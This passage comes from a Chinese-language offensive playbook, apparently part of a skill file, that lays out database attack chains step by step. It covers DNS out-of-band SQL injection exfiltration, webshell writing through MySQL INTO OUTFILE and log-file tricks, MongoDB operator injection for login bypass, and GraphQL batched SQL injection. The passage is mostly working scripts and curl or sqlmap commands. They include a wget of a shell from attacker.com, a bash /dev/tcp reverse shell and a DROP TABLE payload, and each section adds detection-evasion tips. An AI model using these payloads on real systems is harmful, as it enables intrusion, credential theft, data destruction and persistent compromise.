        domain = b'.'.join(data[12:].split(b'\x00')[0].split(b'\x03')[1:]).decode(errors='ignore')
        print(f"[DNS Query] {self.client_address[0]} -> {domain}")
        # 返回空响应
        response = data[:2] + b'\x81\x80' + data[4:6]*2 + b'\x00\x00\x00\x00' + data[12:]
        self.request[1].sendto(response, self.client_address)

server = socketserver.UDPServer(('0.0.0.0', 53), DNSHandler)
print("[*] DNS 服务器监听 0.0.0.0:53")
server.serve_forever()
EOF
python3 /data/user/work/dns_server.py
```

**步骤 2：手工触发 DNS 外带确认通道**

```bash
# MySQL (Windows 目标) - LOAD_FILE UNC 路径触发 DNS
# 目标 SQL: SELECT LOAD_FILE('\\\\test.attacker.com\\share')
# 编码进注入点:
curl "http://target.com/product?id=1';SELECT LOAD_FILE('\\\\test.attacker.com\\share')-- -"

# MSSQL - xp_dirtree 触发 DNS（最常用）
# ; EXEC master..xp_dirtree '\\test.attacker.com\share'
curl "http://target.com/product?id=1';EXEC%20master..xp_dirtree%20'\\test.attacker.com\share'-- -"

# PostgreSQL - 大对象 + COPY 触发（需要 superuser）
# CREATE TEMP TABLE exfil(data text); COPY exfil FROM PROGRAM 'nslookup test.attacker.com';
```

**步骤 3：sqlmap --dns-domain 自动化盲注外带**

```bash
# sqlmap 原生支持 DNS 外带盲注
# 需要配置一个你控制的 DNS 域名，所有 *.xxx.attacker.com 都解析到你
sqlmap -u "http://target.com/product?id=1" \
  --dns-domain="exfil.attacker.com" \
  --dbms=mysql \
  --technique=B \
  --level=5 --risk=3 \
  --batch \
  --threads=4

# sqlmap 工作原理:
# 1. 注入 payload: 1 AND LOAD_FILE('\\\\'||(<query>)||'.exfil.attacker.com\\a')
# 2. <query> 结果作为子域名，如 password="admin123" → admin123.exfil.attacker.com
# 3. sqlmap 监听 DNS 查询，解析子域名获取数据
# 4. 每个 DNS 查询外带一段数据（受域名长度限制，约 63 字符/标签）

# MSSQL 版本
sqlmap -u "http://target.com/product?id=1" \
  --dns-domain="exfil.attacker.com" \
  --dbms=mssql \
  --technique=B \
  --os-shell  # 外带确认后尝试获取 OS shell
```

**步骤 4：手工 DNS 外带提取数据（MySQL 完整脚本）**

```python
# dns_exfil_sqli.py - 手工盲注 + DNS 外带提取
# 针对 MySQL + Windows 目标
import requests
import string
import time

TARGET = "http://target.com/product?id=1"
DNS_DOMAIN = "exfil.attacker.com"

def dns_exfil_query(payload):
    """
    构造 DNS 外带 payload 并发送
    payload: SQL 子查询，结果将被外带
    """
    # LOAD_FILE 触发 UNC 路径 DNS 解析
    # SELECT LOAD_FILE(CONCAT('\\\\',(payload),'.exfil.attacker.com\\a'))
    full_payload = f"1 AND LOAD_FILE(CONCAT('\\\\\\\\',({payload}),'.{DNS_DOMAIN}\\\\a'))-- -"
    r = requests.get(TARGET, params={"id": full_payload})
    return r

def extract_string(sql_expression, max_len=64):
    """
    逐字符提取 SQL 查询结果
    sql_expression: 如 "(SELECT password FROM users WHERE id=1)"
    """
    result = ""
    for pos in range(1, max_len + 1):
        # 使用 HEX + SUBSTRING 避免特殊字符破坏 DNS 域名
        # 每次外带 2 个字符的 HEX 表示
        payload = f"SELECT HEX(SUBSTRING(({sql_expression}),{pos},2))"
        # 发送并等待 DNS 日志
        dns_exfil_query(payload)
        time.sleep(1)  # 等待 DNS 传播
        # 从 DNS 日志中解析（需要监听服务配合）
        # hex_chunk = read_from_dns_log()
        # result += bytes.fromhex(hex_chunk).decode()
    return result

# 提取 admin 密码哈希
password = extract_string("(SELECT password FROM users WHERE username='admin')")
print(f"[*] Admin password hash: {password}")
```

**检测规避要点**：
- DNS 走 53 端口 UDP，大多数防火墙允许出站
- 子域名编码用 HEX 避免特殊字符
- 每个 DNS 标签最多 63 字符，长数据需分段
- 配合 `--delay` 降低请求频率规避频率检测

---

### 攻击链 3：SQL 注入提权至 RCE（MySQL INTO OUTFILE + Webshell）

**场景**：MySQL 注入点确认，当前用户具有 `FILE` 权限，`secure_file_priv` 为空（允许任意路径写入），Web 根目录可写。

**CVE 参考**：此类配置问题在 2026 年仍频繁出现于自建 LAMP/LNMP 环境，相关 CVE 如 CVE-2024-XXX（MySQL 配置不当）。

**步骤 1：确认 FILE 权限和 secure_file_priv 配置**

```bash
# 检查当前用户权限
sqlmap -u "http://target.com/product?id=1" --dbms=mysql \
  --sql-query="SELECT CONCAT(user,'@',host) FROM mysql.user WHERE File_priv='Y'"

# 检查 secure_file_priv（必须为空字符串才能写任意路径）
sqlmap -u "http://target.com/product?id=1" --dbms=mysql \
  --sql-query="SELECT @@secure_file_priv, @@datadir, @@version_compile_os"

# 若 secure_file_priv 为 NULL → 完全禁止文件操作，此链不可用
# 若 secure_file_priv 为 '/var/lib/mysql-files/' → 只能写该目录（需配合 webshell 路径技巧）
# 若 secure_file_priv 为 '' → 可写任意路径，攻击成功
```

**步骤 2：探测 Web 根目录路径**

```bash
# 方法 1: 通过 @@datadir 推断
sqlmap -u "http://target.com/product?id=1" --dbms=mysql \
  --sql-query="SELECT @@datadir"
# /var/lib/mysql/ → Web 根通常在 /var/www/html/ 或 /usr/share/nginx/html/

# 方法 2: 通过 LOAD_FILE 读取常见配置文件确认路径
sqlmap -u "http://target.com/product?id=1" --dbms=mysql \
  --sql-query="SELECT LOAD_FILE('/etc/nginx/sites-enabled/default')"

# 方法 3: 读取 Apache/Nginx 配置
sqlmap -u "http://target.com/product?id=1" --dbms=mysql \
  --sql-query="SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf')"
```

**步骤 3：通过 INTO OUTFILE 写入 Webshell**

```bash
# 直接通过 sqlmap 的 --os-shell（自动化写入 webshell）
sqlmap -u "http://target.com/product?id=1" --dbms=mysql \
  --os-shell \
  --web-root="/var/www/html/"

# 手工写入（更隐蔽，可自定义文件名和路径）
# 写入一句话木马: <?php @eval($_POST['cmd']);?>
sqlmap -u "http://target.com/product?id=1" --dbms=mysql \
  --sql-query="SELECT '<?php @eval(\$_POST[\"cmd\"]);?>' INTO OUTFILE '/var/www/html/.config.php'"

# 写入命令执行 webshell（更实用）
sqlmap -u "http://target.com/product?id=1" --dbms=mysql \
  --sql-query="SELECT '<?php system(\$_GET[\"c\"]);?>' INTO OUTFILE '/var/www/html/uploads/.htaccess.php'"

# 验证 webshell
curl "http://target.com/uploads/.htaccess.php?c=id"
# 预期输出: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**步骤 4：绕过 secure_file_priv 限制（若非空）**

```bash
# 若 secure_file_priv='/var/lib/mysql-files/'，尝试以下绕过:

# 绕过 1: MySQL 8.0+ 的 LOAD DATA LOCAL INFILE（需客户端支持）
# 不受 secure_file_priv 限制
sqlmap -u "http://target.com/product?id=1" --dbms=mysql \
  --sql-query="SET GLOBAL general_log='ON'; SET GLOBAL general_log_file='/var/www/html/shell.php'; SELECT '<?php system(\$_GET[\"c\"]);?>'"

# 绕过 2: 利用慢查询日志写文件（不受 secure_file_priv 限制）
sqlmap -u "http://target.com/product?id=1" --dbms=mysql \
  --sql-query="SET GLOBAL slow_query_log='ON'; SET GLOBAL slow_query_log_file='/var/www/html/slow.php'; SELECT '<?php system(\$_GET[\"c\"]);?>' OR SLEEP(11)"

# 绕过 3: 若有 CREATE 权限，利用 UDF（User Defined Function）执行系统命令
# 需要将 .so 文件写入 plugin 目录
sqlmap -u "http://target.com/product?id=1" --dbms=mysql \
  --sql-query="SHOW VARIABLES LIKE 'plugin_dir'"
# 然后通过 sqlmap --os-shell 的 UDF 路径自动完成
```

**步骤 5：利用 Webshell 持久化**

```bash
# webshell 写入后，上传完整 webshell 管理工具
curl "http://target.com/uploads/.htaccess.php?c=wget%20http://attacker.com/shell.php%20-O%20/var/www/html/wp-content/uploads/2024/shell.php"

# 或直接反弹 shell
curl "http://target.com/uploads/.htaccess.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/attacker.com/4444%200%3E%261%27"
```

**检测规避要点**：
- Webshell 文件名伪装为 `.htaccess.php`、`.config.php` 等隐藏文件
- 写入 uploads/ 等可能不受 `.htaccess` 限制的目录
- 使用 `$_POST` 参数避免出现在 access log
- 慢查询日志绕过 `secure_file_priv` 是 2026 年仍有效的技巧

---

### 攻击链 4：NoSQL 注入（MongoDB 操作符注入）至认证绕过

**场景**：目标使用 Node.js + Express + MongoDB，登录接口直接将 JSON body 传入 `User.findOne()`，无输入验证。

**CVE 参考**：CWE-943（NoSQL 注入），2026 年仍在 SaaS 应用中高频出现。

**步骤 1：探测 NoSQL 注入点**

```bash
# 测试 $ne 操作符绕过认证
# 原始请求: {"username":"admin","password":"password123"}
# 注入: {"username":{"$ne":""},"password":{"$ne":""}}
# 含义: username 不等于空 AND password 不等于空 → 返回第一个用户
curl -i -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# 若返回 200 + 登录成功 token → 确认 NoSQL 注入
# $ne = "not equal"，匹配所有非空值 → 返回数据库第一个用户

# 测试 $gt 操作符（greater than）
curl -i -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}'

# 测试 $regex 正则匹配
curl -i -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":"admin"},"password":{"$ne":""}}'
```

**步骤 2：逐字符提取密码（$regex 盲注）**

```python
# nosql_blind_extract.py - MongoDB $regex 盲注提取密码
import requests
import string

TARGET = "http://target.com/api/login"
CHARSET = string.ascii_letters + string.digits + "!@#$%^&*"

def check_prefix(prefix):
    """检查密码是否以 prefix 开头"""
    payload = {
        "username": "admin",
        "password": {"$regex": f"^{prefix}.*"}
    }
    r = requests.post(TARGET, json=payload)
    return "登录成功" in r.text or r.status_code == 200

def extract_password():
    """逐字符提取 admin 密码"""
    password = ""
    for i in range(32):  # 最多 32 字符
        found = False
        for ch in CHARSET:
            if check_prefix(password + ch):
                password += ch
                print(f"[*] 已提取: {password}")
                found = True
                break
        if not found:
            break
    return password

password = extract_password()
print(f"[+] Admin 密码: {password}")
```

**步骤 3：利用 $where JavaScript 注入执行任意代码**

```bash
# $where 接受 JavaScript 表达式，可执行任意 JS
# 利用 sleep() 进行时间盲注确认
curl -i -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"$where":"if(this.username == \"admin\"){sleep(3000);return true}else{return false}"}'

# 若响应延迟 3 秒 → 确认 $where 注入

# $where 提取数据（时间盲注）
# 每个 char 比较一次，正确则 sleep
curl -i -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"$where":"function(){if(this.username.charCodeAt(0)==97){sleep(3000)}return true}"}'
# charCodeAt(0)==97 即 'a'，正确则延迟 3 秒

# $where 执行命令（MongoDB 4.2-，需特定条件）
# 旧版 MongoDB 的 $where 上下文可访问 global 对象
curl -i -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"$where":"function(){return d=new Date,d.setTime((new Date).getTime()+5000),(new Date).getTime()<d.getTime()&&this.username==\"admin\"}"}'
```

**步骤 4：绕过输入过滤（2026 新技巧）**

```bash
# 若应用过滤 "$ne" 等关键词（正则 /\$(ne|gt|regex|where)/i）
# 绕过 1: Unicode 转义（详见 SKILL.md 2026 章节）
curl -i -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"\u0024ne":""},"password":{"\u0024ne":""}}'

# 绕过 2: 大小写混淆（若正则无 /i 标志）
curl -i -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$NE":""},"password":{"$NE":""}}'

# 绕过 3: 使用 $in/$nin 替代 $ne（等价语义）
curl -i -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$nin":[null,""]},"password":{"$nin":[null,""]}}'

# 绕过 4: 使用 $mod / $exists 等替代操作符
curl -i -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$exists":true},"password":{"$exists":true}}'
```

**步骤 5：注入到提取完整数据库**

```bash
# 利用 $regex 提取所有用户名
curl -i -X POST http://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"name":{"$regex":".*","$options":"i"},"$limit":1000}'

# 注入 $limit 绕过分页限制
curl -i -X POST http://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"query":{},"$limit":999999}'

# 注入 $projection 提取敏感字段
curl -i -X POST http://target.com/api/users/profile \
  -H "Content-Type: application/json" \
  -d '{"projection":{"password":1,"email":1,"api_key":1,"secret":1}}'
```

**检测规避要点**：
- `$nin`、`$exists`、`$mod` 等替代操作符绕过关键词黑名单
- Unicode `\u0024` 编码 `$` 绕过字符串匹配
- `$regex` 配合 `^` 锚点实现高效盲注
- `$where` 的 `sleep()` 时间盲注不产生流量特征

---

### 攻击链 5：GraphQL 批量查询 SQLi（sqlmap 集成）

**场景**：目标使用 GraphQL API，存在 N+1 查询问题，resolver 将参数直接拼接进 SQL。利用 GraphQL 批量查询（batching）放大 SQL 注入效率。

**CVE 参考**：CWE-89 + GraphQL batching amplification，2026 年 Apollo Server / GraphQL Yoga 等默认开启 batching。

**步骤 1：探测 GraphQL 端点和注入点**

```bash
# 探测 GraphQL 端点
curl -i -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# 内省查询获取 schema
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind ofType{name}}}}}}"}' | jq

# 测试具体查询的注入点
# 假设 schema 有: user(id: ID!): User
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{user(id:\"1'\'' OR 1=1-- -\"){id name email password}}"}'
# 若返回所有用户 → SQL 注入确认
```

**步骤 2：sqlmap 集成 GraphQL 端点**

```bash
# sqlmap 支持 GraphQL，需将注入点标记为 *
# 方法 1: 使用 --data 发送 GraphQL JSON
sqlmap -u "http://target.com/graphql" \
  --method=POST \
  --data='{"query":"{user(id:\"*\"){id name email password}}"}' \
  --dbms=mysql \
  --level=5 --risk=3 \
  --batch

# 方法 2: 若注入点在变量中（更常见）
sqlmap -u "http://target.com/graphql" \
  --method=POST \
  --data='{"query":"query GetUser($id: ID!){user(id:$id){id name email password}}","variables":{"id":"*"}}' \
  --dbms=mysql \
  --level=5 --risk=3

# 提取数据库
sqlmap -u "http://target.com/graphql" \
  --method=POST \
  --data='{"query":"{user(id:\"*\"){id name}}"}' \
  --dbms=mysql \
  --dbs --batch

# 提取表
sqlmap -u "http://target.com/graphql" \
  --method=POST \
  --data='{"query":"{user(id:\"*\"){id name}}"}' \
  --dbms=mysql \
  -D webapp --tables --batch

# dump 用户表
sqlmap -u "http://target.com/graphql" \
  --method=POST \
  --data='{"query":"{user(id:\"*\"){id name}}"}' \
  --dbms=mysql \
  -D webapp -T users --dump --batch
```

**步骤 3：利用 GraphQL 批量查询放大注入**

```python
# graphql_batch_sqli.py - 利用 GraphQL batching 并发注入
# 一次 HTTP 请求发送多个查询，绕过速率限制 + 加速盲注
import requests
import json

TARGET = "http://target.com/graphql"

def batch_blind_sqli(char_positions, char_range):
    """
    利用 GraphQL batching 一次请求测试多个字符位置
    传统盲注: 1 字符/请求
    批量盲注: N 字符/请求（N = 批量查询数量）
    """
    queries = []
    for pos in char_positions:
        for ch in char_range:
            # 构造布尔盲注: 若 password 第 pos 位是 ch，返回 user，否则返回 null
            payload = f"1' AND SUBSTRING((SELECT password FROM users WHERE id=1),{pos},1)='{ch}'-- -"
            queries.append({
                "query": f'{{user(id:"{payload}"){{id}}}}'
            })

    # 批量发送（GraphQL 允许数组形式批量查询）
    response = requests.post(TARGET, json=queries)
    results = response.json()

    # 解析哪些查询返回了数据（True）
    password = {}
    for i, (pos, ch) in enumerate([(p, c) for p in char_positions for c in char_range]):
        if i < len(results) and results[i].get("data", {}).get("user"):
            password[pos] = ch

    return password

# 提取密码前 8 个字符（每个字符测试 a-z, 0-9）
import string
positions = range(1, 9)
charset = string.ascii_lowercase + string.digits

result = batch_blind_sqli(positions, charset)
password = "".join(result.get(i, "?") for i in positions)
print(f"[+] 提取的密码: {password}")
```

**步骤 4：GraphQL 嵌套查询 SQL 注入（N+1 放大）**

```bash
# 利用 GraphQL 嵌套查询触发多次 SQL 查询
# 若 resolver 对每个嵌套节点执行独立 SQL，可放大注入

# 恶意嵌套查询: 一次性触发 100 个子查询，每个带不同注入 payload
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { users(first: 100) { id name posts { id title author { id name email password } } } }"
  }'

# 若 posts.author resolver 每次执行独立 SQL:
# SELECT * FROM users WHERE id = ?
# 则 100 个 post → 100 次 SQL 查询 → 100 个注入点

# 结合 alias 别名构造多重注入
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { a1: user(id:\"1 OR 1=1--\"){id} a2: user(id:\"1 UNION SELECT 1,2,3--\"){id} a3: user(id:\"1 AND SLEEP(5)--\"){id} }"
  }'

# 一个请求测试 3 种不同注入技术，减少请求数量
```

**步骤 5：绕过 GraphQL 深度/复杂度限制**

```bash
# 若目标启用 query complexity 限制，使用 alias 规避
# alias 不计入深度计算，但每个 alias 触发独立 resolver

# 使用 fragments 分散 payload
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "fragment u on User{id name email password} query { user(id:\"1 OR 1=1--\"){...u} }"
  }'

# 若 mutation 接受数组输入，注入每个元素
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { updateUsers(ids:[\"1; DROP TABLE logs--\",\"2; SELECT pg_sleep(5)--\"]) { success } }"
  }'
```

**检测规避要点**：
- GraphQL batching（数组请求）将 N 次注入合并为 1 次 HTTP 请求，绕过速率限制
- Alias 别名查询不增加深度，但触发独立 SQL 查询
- 嵌套查询的 N+1 问题是天然的注入放大器
- GraphQL 变量注入比内联注入更隐蔽（payload 在 variables 字段而非 query 字段）
